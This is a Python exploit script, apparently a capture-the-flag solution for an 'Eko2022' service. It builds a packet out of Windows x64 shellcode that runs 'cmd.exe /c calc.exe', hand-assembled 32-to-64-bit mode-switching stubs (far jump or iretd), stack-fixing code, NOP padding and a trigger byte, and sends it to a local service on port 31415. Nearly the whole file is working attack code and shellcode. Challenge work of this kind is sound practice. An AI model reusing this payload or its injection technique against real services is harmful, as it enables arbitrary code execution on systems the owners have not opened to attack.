import sys
import struct
import socket

buf =  b""
buf += b"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51"
buf += b"\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52"
buf += b"\x60\x48\x8b\x52\x18\x48\x8b\x52\x20\x48\x8b\x72"
buf += b"\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0"
buf += b"\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41"
buf += b"\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b"
buf += b"\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48"
buf += b"\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44"
buf += b"\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41"
buf += b"\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0"
buf += b"\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1"
buf += b"\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8\x58\x44"
buf += b"\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44"
buf += b"\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01"
buf += b"\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59"
buf += b"\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41"
buf += b"\x59\x5a\x48\x8b\x12\xe9\x57\xff\xff\xff\x5d\x48"
buf += b"\xba\x01\x00\x00\x00\x00\x00\x00\x00\x48\x8d\x8d"
buf += b"\x01\x01\x00\x00\x41\xba\x31\x8b\x6f\x87\xff\xd5"
buf += b"\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd\x9d\xff"
buf += b"\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
buf += b"\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89"
buf += b"\xda\xff\xd5\x63\x6d\x64\x2e\x65\x78\x65\x20\x2f"
buf += b"\x63\x20\x63\x61\x6c\x63\x2e\x65\x78\x65\x00"

p16 = lambda x: struct.pack('<H', x)
p32 = lambda x: struct.pack('<L', x)
p64 = lambda x: struct.pack('<Q', x)

class ss:
	def __init__(self, ip, port):
		self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		self.s.connect((ip, port))
		# self.s.settimeout(3)

	def close(self):
		self.s.close()

	def read(self, n):
		return self.s.recv(n)

	def read_line(self):
		return self.read_until(b'\n')

	def read_until(self, until):
		string = b''
		while True:
			string += self.s.recv(1)
			if until in string:
				break
		return string 	

	def write(self, s):
		self.s.send(s)		

	def write_line(self, s):
		self.s.send(s + b'\n')
    
	def write_after(self, until, s):
		self.read_until(until)
		self.write_line(s)

USE_JMPFAR = 0

syn = b'Hello\0'

pkg = b''

hdr = [
	b'Eko2022\0',   # cookie
	b'\x54',        # message id
	p16(0xFFFF)     # package size
]

ctx_switch_64to32 = [
	p32(0x10000000),         # RIP
	p32(0x23),               # CS (switch to x86)
	p32(0x246),              # EFLAG
	p32(0x10000000 + 0x800), # RSP
	p32(0x53)                # SS
]
ctx_switch_64to32[0] = p32(0x10000000 + len(b''.join(ctx_switch_64to32))) # RIP
pkg += b''.join(ctx_switch_64to32)

ctx_switch_32to64_jmp = [
	# jmp far 033:address
	b'\xea',			# jmp far
	p32(0x10000000),	# address
	b'\x33\x00'			# CS
	# mov rcx, rsp
]
ctx_switch_32to64_jmp[1] = p32(0x10000000 + 
								len(b''.join(ctx_switch_64to32)) +
								len(b''.join(ctx_switch_32to64_jmp))
								)

ctx_switch_32to64_iret = [
	##### x86

	# fix stack segment
	b'\xb8' + p32(0x2b), # mov eax, 2bh
	b'\x8e\xd0',		 # mov ss, ax
	b'\x90',			 # nop
	
	b'\x6a\x2b',		 # push 2bh
	b'\x68' + p32(0x10000000 + 0x800), # push 1000800h
	b'\x68' + p32(0x246), # push 46h -> EFLAG
	b'\x6a\x33',		 # push 33h -> CS
	b'\xe8' + p32(0),	 # call $+5
	b'\x83\x04\x24\x05', # add dword ptr [esp], 5 -> EIP: jump to fix_stack_addr
	b'\xcf',			 # iretd

]

pkg += b''.join(ctx_switch_32to64_jmp) if USE_JMPFAR else b''.join(ctx_switch_32to64_iret)

fix_stack_addr = [
	##### x64
	b'\x90'*4,
	b'\x48\x33\xC0',		 # xor rax, rax
	b'\x65\x48\x8b\x40\x08', # mov rax, qword ptr gs:[rax+8] -> get stack base
	b'\x48\xc1\xe8\x20',	 # shr rax, 32
	b'\x48\xc1\xe0\x20',	 # shl rax, 32
	b'\x48\x0b\xc1',		 # or rax, rcx
	b'\x48\x8b\xe0'			 # rsp, rax
	b'\x90'*4,
]
pkg += b''.join(fix_stack_addr)

pkg += buf
pkg += b'\x90' * (0xf00 - len(pkg))
pkg += b'\x58' # message trigger id
pkg += b'\x90' * (0xf08 - len(pkg))

pld = b''.join(hdr) + pkg


s = ss('127.0.0.1', 31415)
s.write(b'Hello\0')
print(s.read(1024))
s.write(pld)
print(s.read(1024))

# input()
